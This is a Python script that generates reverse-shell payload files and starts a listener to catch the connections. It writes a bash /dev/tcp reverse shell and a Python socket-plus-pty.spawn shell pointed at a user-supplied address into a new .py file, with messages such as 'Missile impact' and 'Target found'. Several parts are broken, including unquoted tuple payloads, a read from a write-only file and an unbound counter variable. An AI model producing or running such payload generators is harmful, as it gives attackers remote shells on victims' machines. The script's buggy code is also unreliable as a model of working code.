import os
import sys
import time
import random
import socket

def run():
  addr = input("Your listening IPv4 address (ex: 10.10.10.10): ")
  prt = input("\n Target port enter for default(10000): ")
  name = input("Payload name")
  tm = 0
  file_path = name + ".py"
  if prt == "":
    prt = 10000
  
  payload = "bash -i >& /dev/tcp/", addr, "/", prt, " 0>&1"
  payload2 = 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((addr,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
  try:
    with open(file_path, 'w') as file:
        payload = "bash -i >& /dev/tcp/", addr, "/", prt, " 0>&1"
        payload2 = 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((addr,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
        file.write("import sys\nimport os\nimport time\nimport random\nimport socket\n")
        file.write("try:\n")
        file.write("  os.system(" + str(payload) + ")\n")
        file.write("\nexcept:\n")
        file.write('\n  print("Load 1 failed")\n')
      
        file.write("try:\n")
        file.write("  " + str(payload2) + "\n")
        file.write("except:\n")
        file.write('  print("Load 2 failed, exiting")\n')
    sys.stdout.write("File " + file_path + " created successfully, containing: " + file.read())
  
  except:
    print("Unable to create file")
    
    
    
  print("Missile is in the air, waiting for impact")
  print("Starting listener...")
  
  
  def start_server():
      # Create a TCP/IP socket
      server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
      # Bind the socket to all interfaces on port 10000
      server_address = ('', prt)  # Empty string for all interfaces
      server_socket.bind(server_address)
  
      # Listen for incoming connections
      server_socket.listen(5)
      print("Listening on port 10000...")
      time.sleep(1)
      tm += 1 
      print(tm, "seconds elapsed")
      
  
      while True:
          # Wait for a connection
          print("Waiting for a connection...")
          client_socket, client_address = server_socket.accept()
          print("Missile impact")
          try:
              print("Connection from ", client_address)
              print("Target found")
              # Handle the connection
              data = client_socket.recv(1024)
              print("Received: {data.decode()}")
              client_socket.sendall(data)
          finally:
              # Clean up the connection
              client_socket.close()
  
  
  start_server()
